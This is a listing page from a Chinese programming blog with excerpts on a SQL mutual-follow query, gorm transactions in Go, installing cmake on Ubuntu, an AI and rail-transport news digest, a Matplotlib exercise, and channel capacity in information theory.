事务日志文件：事务日志文件是用来记录数据更新情况的文件。（.ldf）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3895986000d8b60e5b8173aba3cbe994/" rel="bookmark">
			sql面试题之“互相关注的人”（方法三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：某社交平台有关注这个功能，关注的同时也会被关注。现有需求需要找出平台上哪些用户之间互相关注。
文章目录 题目如下：一、数据准备二、建表并导入数据1.建表2.导入数据3.数据分析和实现思路小结： 题目如下： 某社交平台后端有user_relation 这张表，表里有字段 from_side 和 to_side。如何把相互关注那些人查出来呢？以下方法是第三种方法。
如果想了解前两种方法如下：
sql面试题之“互相关注的人”（方法一）
sql面试题之“互相关注的人”（方法二）
以下数据部分同前两种方法的数据一致，看过的小伙伴可以直接看实现部分。
一、数据准备 数据：我们以火影中的动漫角色为例，首先准备数据。
二、建表并导入数据 1.建表 假设 dms.follow_each_others用来存放数据，如下（示例）：
create table dms.follow_each_others ( from_side STRING ,to_side STRING ) 2.导入数据 建表语句如下（此语法为hive语法，当为impala语法时，overwrite后面的table可以省略）：
insert overwrite table dms.follow_each_others values ('宇智波带土','漩涡鸣人') ,('宇智波带土','波风水门') ,('波风水门','宇智波带土') ,('宇智波佐助','宇智波带土') ,('漩涡鸣人','日向雏田') ,('日向雏田','漩涡鸣人'); 3.数据分析和实现思路 第三种通过我们特别熟悉的join 方式来实现。满足互相关注的人，有此条数据，from_side --&gt;to_side
，那么一定会有 to_side --&gt;from_side ,所以通过自关联很容易实现。如下：
--通过 inner join 实现 select A1.from_side ,A1.to_side ,A2.from_side ,A2.to_side from dms.follow_each_others A1 inner join dms.follow_each_others A2 on A1.from_side = A2.to_side AND A1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3895986000d8b60e5b8173aba3cbe994/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/513041cb7c1bed829e37397a76e818a5/" rel="bookmark">
			gorm 中的事务运用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用背景 在编写业务代码的过程中，如果涉及到多张表的更新操作，为了确保数据的一致性，我们会在业务代码的过程中加上事务的控制，那么针对go 语言中，如果我们使用gorm框架改如何操作呢？
gorm中使用事务的几种方式 方式一(业务层事务) func NewTransaction() *gorm.DB { return suit.GetGormClient().Begin() } tx := s.AlarmDao.NewTransaction() defer tx.Rollback() ...(具体业务处理) err = tx.Commit().Error 方式二(dao层事务) func (r *Repo) TxUpdateBonus(ctx context.Context, bonus *entity.Bonus, transaction *entity.Transaction) error { return r.Connection().Transaction(func(tx *gorm.DB) error { if bonus.ID &lt; 1 { if err := tx.WithContext(ctx).Create(bonus).Error; err != nil { return err } } else { if err := tx.WithContext(ctx).Model(bonus).Updates(bonus.Conv2Map()).Error; err != nil { return err } } if err := tx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/513041cb7c1bed829e37397a76e818a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbb067a0f69a03dcea213a1e89453c83/" rel="bookmark">
			[ubuntu]cmake安装的3种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种：apt安装
sudo apt-get install cmake
这个安装一般不是最新的，安装最新的需要ppa安装这里以ubuntu18.04为例子：
添加签名密钥
wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2&gt;/dev/null | sudo apt-key add -
将存储库添加到您的源列表并进行更新
稳定版
sudo apt-add-repository 'deb https://apt.kitware.com/ubuntu/ bionic main'
sudo apt-get update
候选发布版本
sudo apt-add-repository 'deb https://apt.kitware.com/ubuntu/ bionic-rc main'
sudo apt-get update
查看版本：cmake --version
第二种：源码安装
1.下载源码包
官网下载地址：Download | CMake
选择最新版本的源码包：cmake-xxxxxx.tar.gz
2.安装工具
需要安装gcc、g++、make
sudo apt-get install gcc
sudo apt-get install g++
sudo apt-get install make
3.安装源码包
根据安装版本修改文件名， 解压压缩包：
tar -zxvf cmake-3.21.2.tar.gz
进入解压后的文件目录下，执行如下命令
./configure
make
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbb067a0f69a03dcea213a1e89453c83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08a826b285512d0c2394d20f30190f3b/" rel="bookmark">
			人工智能轨道交通行业周刊-第67期（2023.11.27-12.3）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本期关键词：列车巡检机器人、城轨智慧管控、制动梁、断路器、AICC大会、Qwen-72B
1 整理涉及公众号名单 1.1 行业类 RT轨道交通人民铁道世界轨道交通资讯网铁路信号技术交流北京铁路轨道交通网上榜铁路视点ITS World轨道交通联盟VSTR铁路与城市轨道交通RailMetro轨道世界铁路那些事铁路技术创新智慧交通RTAI智慧城轨网轨道交通智能装备NE轨道交通铁路供电上海铁道兰州铁路中国地方铁路协会铁路社评轨道部落现代轨道交通城市地铁捡瓶子的小灰灰马公子的杂货铺 1.2 人工智能类 江大白糙科技新智元AI科技评论智东西量子位我爱计算机视觉极视平台人工智能学家AI前线当交通遇上机器学习计算机视觉life新机器视觉雷锋网人工智能产业发展联盟AIIA自动驾驶之心笔记侠夕小瑶科技说水木人工智能学堂 2 数字轨道 （1）解密东莞轨道交通列车智能巡检机器人
导读：在不断探索列车运维效率与服务质量提升的道路上，东莞轨道交通2号线与时俱进，积极应用人工智能和自动控制技术，为列车检修工作带来科技感满满的小助手——列车智能巡检机器人。让我们一起来认识一下它吧~
（2）满身“黑科技” 19号线二期打造出行“智慧化名片”
导读： 前不久，成都轨道交通19号线二期车站正式亮相，倍受网友关注，“大气简约！”“好看！极简时尚风”等评价纷纷涌现。事实上，成都轨道交通19号线二期工程不仅仅是“高颜值担当”，更是满载了“一身”的“黑科技”。智能建造、智能运维、智慧车站……快来看看都有哪些应用吧~
（3）分享 | 基于数字孪生的城轨智慧管控平台研究与实施
导读：10月27-28日，2023（第七届）中国城市轨道交通智慧运维大会在武汉顺利举行。会议上，北京城建设计发展集团股份有限公司技术研究院技术总监兼数字信息技术中心主任韩德志发表了《基于数字孪生的城轨智慧管控平台研究与实施》报告，从背景、现状、实施理念、经验积累、未来展望等方面介绍了其思考。
3 轨道知识 （1）火车迷 | 火车也有“大腿”？
导读：小伙伴们乘火车出行，经常会看到列车进站时平稳地停靠在站台旁，那么，问题来了，是什么力量让列车停下来，当然，是靠火车“大腿”的力量停下来，那么，火车的“大腿”是什么呢？
（2）铁路八大专业安全有“画”说
导读：为强化全员对安全风险的认知和理解，有效提升风险管控效果，集团公司安全监察室、党委宣传部联合各业务部室及相关单位，紧扣12大安全关键、95项重大较大风险，以图文并茂的形式，创作推出《安全风险系列漫画》，教育引导干部职工树牢大安全观念，严守安全底线。来看看各专业都有哪些注意事项吧~
（3）铁路信号专业断路器常识科普
导读：电务工作相关的老铁们经常提起“断路器”这个词，今天我们就来简单科普一下铁路信号断路器常识，主要给其它专业普及，信号专业可绕道
4 AI产业 （1）北京大模型应用再加码！发创新应用白皮书、点亮公共算力平台、首期中文互联网语料库CCI亮相
导读：在AICC 2023人工智能计算大会上，北京市公布了大模型应用、算力基础设施、中文数据集三方面的重磅新成果，北京市已经形成了从算力、数据、应用三个角度出发，围绕软硬件基础设施、关键技术、应用落地等重点为这一产业打造了一系列支撑，大模型正重塑千行百业。
（2）卷大模型开源，正确姿势是什么？
导读：本文对大模型的开源现状进行了总结，一般说来，开发者选大模型会有几个标准：第一，模型效果好是基础分。第二，生态好，社区好，再加之配套工具链全。第三，持续性，持续投入好比一种保障，所以开源背后的团队，实力越强越好，不能仅靠“用爱发电”。
（3）ChatGPT 问世一周年之际，开源大模型能否迎头赶上？
导读：就在11月30日，ChatGPT 迎来了它的问世一周年，这个来自 OpenAI 的强大AI在过去一年里取得了巨大的发展，迅速吸引各个领域的用户群体。在这个具有里程碑意义的时刻，我们在回顾这一引领变革的产品的同时，也需要注意到新一代的开源大语言模型也在崛起。
这些开源大模型发展到什么程度了？能否赶超一年前发布的 ChatGPT呢？
（4）重磅！阿里巴巴开源最大参数规模大模型——高达720亿参数规模的Qwen-72B发布！还有一个的18亿参数的Qwen-1.8B
导读：Qwen系列是阿里巴巴开源的一系列大语言模型，阿里巴巴开源了720亿参数规模的Qwen-72B，是目前国内最大参数规模的开源大语言模型，应该也是全球范围内首次有和Llama2-70B同等规模的大语言模型开源。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75e508300e3651777bfb5460a6559c16/" rel="bookmark">
			头歌-Matplotlib-第1关：画图接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		任务描述相关知识 导入matplotlib显示图像画图接口编程要求测试说明 任务描述 本关任务：掌握matplotlib的基本使用技巧，并能简单使用matplotlib进行可视化。
相关知识 在深入使用matplotlib之前你需要知道几个matplotlib技巧，这些技巧能帮助你更快速掌握matplotlib。
导入matplotlib 和numpy,pandas一样，在导入matplotlib时我们也可以用一些常用的简写形式：
import matplotlib as mplimport matplotlib.pyplot as plt pyplot是最常用的画图模块接口，功能非常强大。
显示图像 开发环境的不同，显示图像的方式也就不一样，一般有三种开发环境，分别是脚本、IPython shell、IPython Notebook。
在脚本中使用matplotlib进行可视化时显示图像可以使用plt.show()。
在IPython shell中使用matplotlib可视化非常方便，使用%matplotlib命令启动matplotlib模式。之后的任何plt命令都会自动打开一个图像窗口，当有新的命令，图像就会更新。但对已经画好的图像不会自动实时更新。对于这种可以使用plt.draw()强制更新。
在IPython Notebook中画图和IPthon shell类似，也需要使用%matplotlib命令。图像的显示是嵌在IPython Notebook页面中。有两种展示形式:%matplotlib notebook交互式图形；%matplotlib inline静态图形。
matplotlib还可以直接将图像保存文件，通过plt.savefig("test.jpg")命令保存文件。
plt.savefig("test.jpg") 画图接口 matplotlib有两个画图接口：一个是便捷的matlab风格接口，另一个是功能更强大的面向对象接口。
matplotlib的matlab接口许多语法都和MATLAB类似，所以使用过MATLAB的朋友们想必很快就能上手matplotlib。
import matplotlib.pyplot as plt#导入模块plt.figure(figsize=(10,10))#创建图形,并设置大小为10 x 10plt.subplot(2,1,1)#创建子图1（行，列，子图编号）plt.plot([1,2,3,4], [1,2,3,4])plt.subplot(2,1,2)#创建子图2（行，列，子图编号）plt.plot([4,3,2,1], [1,2,3,4])plt.show() 面向对象接口可以适应更加复杂的场景，更好地控制图形，在画比较复杂的图形市，面向对象方法会更方便。通过下面的代码，可以用面向对象接口重新创建之前的图形。
fig,ax=plt.subplots(2)#ax是一个包含2个axes对象的数组ax[0].plot([1,2,3,4], [1,2,3,4])ax[1].plot([4,3,2,1], [1,2,3,4])plt.show() 编程要求 在右侧编辑器Begin-End补充代码，对传入的x，y两个数组做折线图，x对应x轴，y对应y轴。并保存到Task1/image1/T2.png，具体要求如下：
折线图的figsize为(10, 10)；
文件名为Task1/image1/T2.png。
测试说明 平台会对你编写的代码进行测试：
预期输出：你的答案与正确答案一致
import matplotlib matplotlib.use('Agg') import matplotlib.pyplot as plt def student(x, y): # ********** Begin *********# plt.figure(figsize=(10, 10)) plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75e508300e3651777bfb5460a6559c16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4056a2d430179f65973032748ad37313/" rel="bookmark">
			关于信道容量的一点知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“说遍历容量不十分准确，应该叫各态历经性容量。是相对于中断容量说的。理解这个概念不太容易的，首先要理解《信息论》中得香农信道容量，然后结合《随机过程》这门课的内容来理解。通常我们所说的香农容量是在确定性信道条件下得到的信道容量，是一个确定值。但实际上，信道状态是一个不断变化的随机过程，应该采用统计意义上的信道容量来描述。有两种统计意义上的描述方式：1）各态历经信道容量 2）中断信道容量。其中各态历经容量是指随机信道在所有衰落状态下的最大信息速率的时间平均，各态历经容量适用于研究时延不敏感业务，如Email，用来确定最大长期平均传输速率。由于各态历经容量要求业务编码帧很长，显然不适用于语音等具有严格时延要求的业务。对于这类业务，编码帧长度只能跨越有限个信道衰落状态，传统的Shannon容量为0。只能定义中断容量，当以此作为传输速率时，信道能以(1-p％)的概率承载。即其中p为允许的中断概率。”
即香农容量为遍历容量。
而带中断的容量：
即指定中断率下信道能传送的最大恒定传输速率
由于发送端不知信噪比的值，所以只能以一个不依赖瞬时信噪比的固定速率传输
允许以一定概率译错所传输比特，发送端确定一个最小接收信噪比r0，由此确定速率C=Blog(1+r0)。若接收的瞬时信噪比大于或等于r0，则正确译码，否则将出现中断。出现中断的概率Pout=P(r&lt;r0)，正确传输的概率1-Pout，平均正确接收的数据速率(1-Pout)Blog(1+r0)。
https://blog.csdn.net/uestc_zhangli/article/details/78456853
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/61/">«</a>
	<span class="pagination__item pagination__item--current">62/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/63/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>